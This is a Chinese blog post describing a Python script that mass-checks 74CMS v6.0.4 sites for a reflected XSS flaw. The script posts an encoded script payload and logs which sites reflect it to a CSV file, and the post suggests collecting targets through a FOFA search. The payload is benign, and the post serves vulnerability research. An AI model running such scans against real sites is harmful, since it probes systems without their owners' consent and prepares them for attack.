ailx10说：这篇是2024年8月之前写的，后来又改过。day4 我把骑士 CMS 的反射 XSS 实验改成脚本，提交编码后的内容，再根据响应判断有没有回到页面，把结果导出 CSV。手工时能直接看见页面变化，自动化却得先定义“看见什么才算确认”，这一步比循环请求更值得琢磨。笔记里保存了那版请求和判断条件，也暴露出固定参数、响应状态和脚本上下文的问题。写到这里我开始更清楚，反射出来和浏览器真的执行了不是同一步，结果表里最好能留得下这种差别。

---

- 找到对应的POC：[ailx10：骑士CMS v6.0.4 XSS漏洞复现](/posts/a0379/)
- 找到对应的网站：FOFA搜索`body="74CMS"`

批量输出仅作为线索，固定 token、响应状态和 TLS 设置均可能影响检测结果。

![](/notes-assets/88aea7a1ce7ce1199200.webp)

```
import re
import os
import csv
import requests
from datetime import datetime

class CMS74():
    def __init__(self):
        self.version = "-1"
        self.vuln_exist = "-1"
        self.vuln_success_url = "-1"
        self.vuln_success_result = "-1"

    def check_vulnerability(self,url):
        try:
            version_url = "{}/index.php?m=admin&c=index&a=login".format(url)
            response = requests.get(version_url)
            version_pattern = r'Powered by.*?(\w+\s\w+\.\d+.\d+)'
            match = re.search(version_pattern, response.text)

            if match:
                self.version = match.group(1)
                print("74Cms版本:{}".format(self.version))
            else:
                print("74Cms版本:未知")

            headers = {
                "content-type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            }

            body = "key=%253Cscript%253Edocument.body.style.backgroundColor%253D%2527red%2527%253B%253C%252Fscript%253E&__hash__=3d816226814ccf6613b2d889acfba46e_b520282a308bdc2c2214da4c586c1cdc"
            vuln_url = "{}/index.php?m=&c=help&a=help_list".format(url)
            if url.startswith("https://"):
                response = requests.post(vuln_url,headers=headers,data=body,verify=False)
            else:
                response = requests.post(vuln_url, headers=headers,data=body)
            if response.status_code == 200:
                if "<script>document.body.style.backgroundColor='red';</script>" in response.text:
                    print("vuln exist:{}".format(url))
                    self.vuln_exist = 1
                    self.vuln_success_result = 1
                    self.vuln_success_url = vuln_url
                else:
                    print("no vuln:{}".format(url))
                    self.vuln_exist = 0
            else:
                print("response.status_code={}".format(response.status_code))
        except Exception as e:
            print("网络异常:{}".format(e))


    def append_data_to_csv(self,file_name, data):
        file_path = os.path.join(os.getcwd(), file_name)
        file_exists = False
        if os.path.exists(file_path):
            file_exists = True
        with open(file_path, 'a+', newline='') as csvfile:
            writer = csv.writer(csvfile)
            if not file_exists:
                writer.writerow(data.keys())
            writer.writerow(data.values())




if __name__ == "__main__":
    test_url_list = []
    now = datetime.now()
    date_string = now.strftime("%Y-%m-%d")
    with open('url.txt', 'r', encoding='utf-8') as file:
        for line in file:
            test_url_list.append(line.strip())
    for url in test_url_list:
        cms = CMS74()
        url = url[:-1] if url.endswith("/") else url
        cms.check_vulnerability(url)

        url_vuln_info = {
                "url":url,
                "version":cms.version,
                "vuln_exist":cms.vuln_exist,
                "vuln_success_url":cms.vuln_success_url,
                "vuln_success_result":cms.vuln_success_result,
                "date_string":date_string
            }
        cms.append_data_to_csv("out.csv",url_vuln_info)
```

所以CSV里那一列结果，更适合当作待检查线索。把原请求和返回页面留下，下一步再用浏览器确认，能让自动化既省重复劳动，也不至于把结论跑得太快。
